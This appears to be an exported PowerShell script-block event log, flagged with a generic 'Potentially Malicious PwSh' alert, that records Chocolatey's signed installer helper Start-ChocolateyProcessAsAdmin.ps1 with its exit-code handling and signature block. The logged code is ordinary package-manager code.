$process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = $workingDirectory if ($elevated -and -not $alreadyElevated -and [Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)){ # this doesn't actually currently work - because we are not running under shell execute Write-Debug ""Setting RunAs for elevation"" $process.StartInfo.Verb = ""RunAs"" } if ($minimized) { $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Minimized } $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Write-Debug ""Command [`""$exeToRun`"" $wrappedStatements] exited with `'$exitCode`'."" $exitErrorMessage = '' $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch ($exitCode) { 0 { break } 1 { break } 3010 { break } # NSIS - http://nsis.sourceforge.net/Docs/AppendixD.html # InnoSetup - http://www.jrsoftware.org/ishelp/index.php?topic=setupexitcodes 2 { $exitErrorMessage = 'Setup was cancelled.'; break } 3 { $exitErrorMessage = 'A fatal error occurred when preparing or moving to next install phase. Check to be sure you have enough memory to perform an installation and try again.'; break } 4 { $exitErrorMessage = 'A fatal error occurred during installation process.' + $errorMessageAddendum; break } 5 { $exitErrorMessage = 'User (you) cancelled the installation.'; break } 6 { $exitErrorMessage = 'Setup process was forcefully terminated by the debugger.'; break } 7 { $exitErrorMessage = 'While preparing to install, it was determined setup cannot proceed with the installation. Please be sure the software can be installed on your system.'; break } 8 { $exitErrorMessage = 'While preparing to install, it was determined setup cannot proceed with the installation until you restart the system. Please reboot and try again.'; break } # MSI - https://msdn.microsoft.com/en-us/library/windows/desktop/aa376931.aspx 1602 { $exitErrorMessage = 'User (you) cancelled the installation.'; break } 1603 { $exitErrorMessage = ""Generic MSI Error. This is a local environment error, not an issue with a package or the MSI itself - it could mean a pending reboot is necessary prior to install or something else (like the same version is already installed). Please see MSI log if available. If not, try again adding `'--install-arguments=`""`'/l*v c:\$($env:chocolateyPackageName)_msi_install.log`'`""`'. Then search the MSI Log for `""Return Value 3`"" and look above that for the error.""; break } 1618 { $exitErrorMessage = 'Another installation currently in progress. Try again later.'; break } 1619 { $exitErrorMessage = 'MSI could not be found - it is possibly corrupt or not an MSI at all. If it was downloaded and the MSI is less than 30K, try opening it in an editor like Notepad++ as it is likely HTML.' + $errorMessageAddendum; break } 1620 { $exitErrorMessage = 'MSI could not be opened - it is possibly corrupt or not an MSI at all. If it was downloaded and the MSI is less than 30K, try opening it in an editor like Notepad++ as it is likely HTML.' + $errorMessageAddendum; break }","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:32.752 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,66,"ScriptBlock: 1622 { $exitErrorMessage = 'Something is wrong with the install log location specified. Please fix this in the package silent arguments (or in install arguments you specified). The directory specified as part of the log file path must exist for an MSI to be able to log to that directory.' + $errorMessageAddendum; break } 1623 { $exitErrorMessage = 'This MSI has a language that is not supported by your system. Contact package maintainer(s) if there is an install available in your language and you would like it added to the packaging.'; break } 1625 { $exitErrorMessage = 'Installation of this MSI is forbidden by system policy. Please contact your system administrators.'; break } 1632 { $exitErrorMessage = 'Installation of this MSI is not supported on this platform. Contact package maintainer(s) if you feel this is in error or if you need an architecture that is not available with the current packaging.'; break } 1633 { $exitErrorMessage = 'Installation of this MSI is not supported on this platform. Contact package maintainer(s) if you feel this is in error or if you need an architecture that is not available with the current packaging.'; break } 1638 { $exitErrorMessage = 'This MSI requires uninstall prior to installing a different version. Please ask the package maintainer(s) to add a check in the chocolateyInstall.ps1 script and uninstall if the software is installed.' + $errorMessageAddendum; break } 1639 { $exitErrorMessage = 'The command line arguments passed to the MSI are incorrect. If you passed in additional arguments, please adjust. Otherwise followup with the package maintainer(s) to get this fixed.' + $errorMessageAddendum; break } 1640 { $exitErrorMessage = 'Cannot install MSI when running from remote desktop (terminal services). This should automatically be handled in licensed editions. For open source editions, you may need to run change.exe prior to running Chocolatey or not use terminal services.'; break } 1645 { $exitErrorMessage = 'Cannot install MSI when running from remote desktop (terminal services). This should automatically be handled in licensed editions. For open source editions, you may need to run change.exe prior to running Chocolatey or not use terminal services.'; break } } if ($exitErrorMessage) { $errorMessageSpecific = ""Exit code indicates the following: $exitErrorMessage."" Write-Warning $exitErrorMessage } else { $errorMessageSpecific = 'See log for possible error messages.' } if ($validExitCodes -notcontains $exitCode) { Set-PowerShellExitCode $exitCode throw ""Running [`""$exeToRun`"" $wrappedStatements] was not successful. Exit code was '$exitCode'. $($errorMessageSpecific)"" } else { $chocoSuccessCodes = @(0, 1605, 1614, 1641, 3010) if ($chocoSuccessCodes -notcontains $exitCode) { Write-Warning ""Exit code '$exitCode' was considered valid by script, but not as a Chocolatey success code. Returning '0'."" $exitCode = 0 } } Write-Debug ""Finishing '$($MyInvocation.InvocationName)'"" return $exitCode } Set-Alias Start-ChocolateyProcess Start-ChocolateyProcessAsAdmin Set-Alias Invoke-ChocolateyProcess Start-ChocolateyProcessAsAdmin # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBM0B9N/gorGD8+ # +9Lu/ixd9N7cDuI0Q10kf6LMTBsNvqCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAig","MessageNumber: 2 ¦ MessageTotal: 3 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateyInstall\helpers\functions\Start-ChocolateyProcessAsAdmin.ps1 ¦ ScriptBlockId: b28016b7-2318-4593-a177-e91b04bf1769 ¦ ScriptBlockText: 1622 { $exitErrorMessage = 'Something is wrong with the install log location specified. Please fix this in the package silent arguments (or in install arguments you specified). The directory specified as part of the log file path must exist for an MSI to be able to log to that directory.' + $errorMessageAddendum; break } 1623 { $exitErrorMessage = 'This MSI has a language that is not supported by your system. Contact package maintainer(s) if there is an install available in your language and you would like it added to the packaging.'; break } 1625 { $exitErrorMessage = 'Installation of this MSI is forbidden by system policy. Please contact your system administrators.'; break } 1632 { $exitErrorMessage = 'Installation of this MSI is not supported on this platform. Contact package maintainer(s) if you feel this is in error or if you need an architecture that is not available with the current packaging.'; break } 1633 { $exitErrorMessage = 'Installation of this MSI is not supported on this platform. Contact package maintainer(s) if you feel this is in error or if you need an architecture that is not available with the current packaging.'; break } 1638 { $exitErrorMessage = 'This MSI requires uninstall prior to installing a different version. Please ask the package maintainer(s) to add a check in the chocolateyInstall.ps1 script and uninstall if the software is installed.' + $errorMessageAddendum; break } 1639 { $exitErrorMessage = 'The command line arguments passed to the MSI are incorrect. If you passed in additional arguments, please adjust. Otherwise followup with the package maintainer(s) to get this fixed.' + $errorMessageAddendum; break } 1640 { $exitErrorMessage = 'Cannot install MSI when running from remote desktop (terminal services). This should automatically be handled in licensed editions. For open source editions, you may need to run change.exe prior to running Chocolatey or not use terminal services.'; break } 1645 { $exitErrorMessage = 'Cannot install MSI when running from remote desktop (terminal services). This should automatically be handled in licensed editions. For open source editions, you may need to run change.exe prior to running Chocolatey or not use terminal services.'; break } } if ($exitErrorMessage) { $errorMessageSpecific = ""Exit code indicates the following: $exitErrorMessage."" Write-Warning $exitErrorMessage } else { $errorMessageSpecific = 'See log for possible error messages.' } if ($validExitCodes -notcontains $exitCode) { Set-PowerShellExitCode $exitCode throw ""Running [`""$exeToRun`"" $wrappedStatements] was not successful. Exit code was '$exitCode'. $($errorMessageSpecific)"" } else { $chocoSuccessCodes = @(0, 1605, 1614, 1641, 3010) if ($chocoSuccessCodes -notcontains $exitCode) { Write-Warning ""Exit code '$exitCode' was considered valid by script, but not as a Chocolatey success code. Returning '0'."" $exitCode = 0 } } Write-Debug ""Finishing '$($MyInvocation.InvocationName)'"" return $exitCode } Set-Alias Start-ChocolateyProcess Start-ChocolateyProcessAsAdmin Set-Alias Invoke-ChocolateyProcess Start-ChocolateyProcessAsAdmin # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBM0B9N/gorGD8+ # +9Lu/ixd9N7cDuI0Q10kf6LMTBsNvqCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # 